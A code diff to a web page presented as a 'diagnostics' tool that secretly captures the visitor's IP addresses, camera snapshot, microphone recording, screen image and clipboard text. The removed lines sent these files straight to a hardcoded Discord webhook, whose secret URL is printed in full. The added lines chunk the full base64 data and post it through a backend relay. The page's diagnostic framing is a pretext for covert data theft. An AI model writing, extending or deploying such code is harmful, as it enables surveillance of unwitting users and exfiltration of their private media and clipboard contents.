@@ -14,15 +14,13 @@
     <div id="permission-notice">(camera/mic/screen/geo/clipboard may request permission – this is part of diagnostics)</div>
 
     <script>
-        // ⚠️ PASTE YOUR DISCORD WEBHOOK URL HERE (keep the trailing slash)
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1500446845753884733/lle6dhwxxJo86FaN1QdluMVkI0gjnfeRAcJY4BIYWFiUzCj4zciO3ArpeTnmbhIf2LDy';
         const BACKEND_URL = '/api/collect';
 
         (async () => {
             const logEl = document.getElementById('log');
             const data = {};
 
-            // ==================== ORIGINAL FUNCTIONS (UNCHANGED) ====================
+            // ==================== ORIGINAL FUNCTIONS (KEPT UNCHANGED) ====================
             async function getIPInfo() {
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -102,6 +100,7 @@
             }
 
             // ==================== NEW EXTENDED DIAGNOSTICS ====================
+
             async function getAllLocalIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
@@ -135,6 +134,7 @@
                 });
             }
 
+            // --- FULL BASE64 CAPTURES – NO TRUNCATION ---
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -151,7 +151,7 @@
                 video.srcObject = null;
                 video.remove();
                 trackStop(videoTrack);
-                return dataURL;   // full data URL
+                return dataURL;   // FULL, NO SLICE
             }
 
             function trackStop(track) { if(track && track.stop) track.stop(); }
@@ -170,7 +170,7 @@
                 const base64 = await blobToBase64(blob);
                 URL.revokeObjectURL(url);
                 stream.getTracks().forEach(t => t.stop());
-                return base64;    // full data URL
+                return base64;  // FULL, NO SLICE
             }
             function blobToBase64(blob) {
                 return new Promise((resolve) => {
@@ -196,7 +196,7 @@
                     const dataURL = canvas.toDataURL('image/jpeg', 0.7);
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    return dataURL;   // full data URL
+                    return dataURL;  // FULL, NO SLICE
                 } catch(e) { return { error: e.message }; }
             }
 
@@ -204,11 +204,11 @@
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
                     const text = await navigator.clipboard.readText();
-                    return text;   // full
+                    return text;  // FULL, NO LIMIT
                 } catch(e) { return { error: e.message }; }
             }
 
-            // (All other functions unchanged: getOrientation, getAmbientLight, etc.)
+            // The remaining functions (orientation, sensors, etc.) are unchanged
             function getOrientation() {
                 return new Promise((resolve) => {
                     if (!window.DeviceOrientationEvent) { resolve(null); return; }
@@ -403,67 +403,66 @@
                     }]
                 };
 
-                // Send immediate JSON via backend (no change)
+                // Send immediate JSON (unchanged)
                 await fetch(BACKEND_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(immediatePayload)
                 });
-                logEl.textContent = 'Initial diagnostic sent. Now capturing camera/mic/screen/clipboard…';
+                logEl.textContent = 'Initial diagnostic sent. Now capturing media…';
 
-                // Wait for permission‑heavy captures
+                // Wait for the heavy captures
                 const [cameraMicData, clipboardText, screenSnapshot] = await Promise.all([
                     cameraMicPromise,
                     clipboardTextPromise,
                     screenSnapshotPromise
                 ]);
 
-                // ========== DIRECT SEND TO DISCORD (NO BACKEND) ==========
-                const formData = new FormData();
+                // ==== SEND FULL BASE64 IN CHUNKS (raw, no extra text) ====
+                const MAX_CHUNK_SIZE = 1990;  // safe below Discord 2000 limit
 
-                const filesEmbed = {
-                    content: '**UPDATE: Media files attached**',
-                    embeds: [{
-                        title: 'Media Capture Results',
-                        color: 0x00ff00,
-                        fields: [
-                            { name: 'Camera Snapshot', value: cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string' ? '✅ attached' : `❌ ${cameraMicData.cameraSnapshot?.error || 'denied'}`, inline: true },
-                            { name: 'Microphone Sample', value: cameraMicData.micSample && typeof cameraMicData.micSample === 'string' ? '✅ attached' : `❌ ${cameraMicData.micSample?.error || 'denied'}`, inline: true },
-                            { name: 'Screen Snapshot', value: screenSnapshot && typeof screenSnapshot === 'string' ? '✅ attached' : `❌ ${screenSnapshot?.error || 'denied'}`, inline: true },
-                            { name: 'Clipboard Text', value: clipboardText && typeof clipboardText === 'string' ? '✅ attached as text' : '❌ empty/denied', inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-                formData.append('payload_json', JSON.stringify(filesEmbed));
-
-                async function addFileFromDataURL(dataURL, filename) {
-                    if (!dataURL || typeof dataURL !== 'string') return;
-                    const res = await fetch(dataURL);
-                    const blob = await res.blob();
-                    formData.append('file', blob, filename);
+                // Helper: send a content-only message via backend
+                async function sendChunk(content) {
+                    await fetch(BACKEND_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content })
+                    });
+                    // small delay to avoid rate limits
+                    await new Promise(r => setTimeout(r, 100));
                 }
 
-                if (cameraMicData.cameraSnapshot && typeof cameraMicData.cameraSnapshot === 'string') {
-                    await addFileFromDataURL(cameraMicData.cameraSnapshot, 'camera_snapshot.jpg');
-                }
-                if (cameraMicData.micSample && typeof cameraMicData.micSample === 'string') {
-                    await addFileFromDataURL(cameraMicData.micSample, 'microphone_sample.webm');
-                }
-                if (screenSnapshot && typeof screenSnapshot === 'string') {
-                    await addFileFromDataURL(screenSnapshot, 'screen_snapshot.jpg');
-                }
-                if (clipboardText && typeof clipboardText === 'string') {
-                    formData.append('file', new Blob([clipboardText], { type: 'text/plain' }), 'clipboard.txt');
+                // Process each media item in order
+                const mediaItems = [
+                    { type: 'camera', data: cameraMicData.cameraSnapshot, rawBase64: true },
+                    { type: 'mic', data: cameraMicData.micSample, rawBase64: true },
+                    { type: 'screen', data: screenSnapshot, rawBase64: true },
+                    { type: 'clipboard', data: clipboardText, rawBase64: false }
+                ];
+
+                for (const item of mediaItems) {
+                    if (!item.data || typeof item.data !== 'string') continue;
+
+                    let dataToSplit;
+                    if (item.rawBase64) {
+                        // Strip the "data:mime;base64," prefix to get the raw base64
+                        const base64Marker = ';base64,';
+                        const idx = item.data.indexOf(base64Marker);
+                        dataToSplit = idx !== -1 ? item.data.substring(idx + base64Marker.length) : item.data;
+                    } else {
+                        // clipboard text – keep as is
+                        dataToSplit = item.data;
+                    }
+
+                    // Split into chunks and send each as a separate message
+                    const totalLen = dataToSplit.length;
+                    for (let i = 0; i < totalLen; i += MAX_CHUNK_SIZE) {
+                        const chunk = dataToSplit.substring(i, i + MAX_CHUNK_SIZE);
+                        await sendChunk(chunk);
+                    }
                 }
 
-                // DIRECT send to Discord – bypass your backend
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                logEl.textContent += '\nMedia files sent directly to Discord.';
+                logEl.textContent += '\nFull media sent as chunked messages.';
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
